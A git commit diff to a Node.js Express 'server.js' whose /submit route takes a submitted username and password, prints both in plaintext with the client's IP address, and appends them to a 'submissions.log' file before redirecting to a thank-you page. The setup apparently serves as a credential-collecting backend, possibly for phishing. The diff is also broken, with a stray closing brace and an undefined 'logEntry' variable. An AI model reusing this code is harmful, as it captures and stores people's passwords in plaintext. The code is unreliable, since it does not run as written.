ae2942b91139c71e61a1b450958893a6749d7c99
kopfab112233 <lucaalexanderu@gmail.com>
2025-06-04 18:08:27 +0200

    Update server.js

--- server.js
+++ server.js
@@ -1,6 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -9,13 +10,19 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 app.post('/submit', (req, res) => {
-  console.log("🔁 POST /submit wurde aufgerufen");
-  console.log("Formulardaten:", req.body);
-
+  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const { username, password } = req.body;
 
-  console.log("👤 Benutzername erhalten:", username);
-  console.log("🔑 Passwort erhalten:", password);
+  console.log("🔁 POST /submit wurde aufgerufen");
+  console.log("👤 Benutzername:", username);
+  console.log("🔑 Passwort:", password);
+  console.log("🌐 IP-Adresse:", clientIp);
+
+  };
+
+  fs.appendFile('submissions.log', JSON.stringify(logEntry) + '\n', (err) => {
+    if (err) console.error("Fehler beim Schreiben der Log-Datei:", err);
+  });
 
   res.redirect('/danke.html');
 });
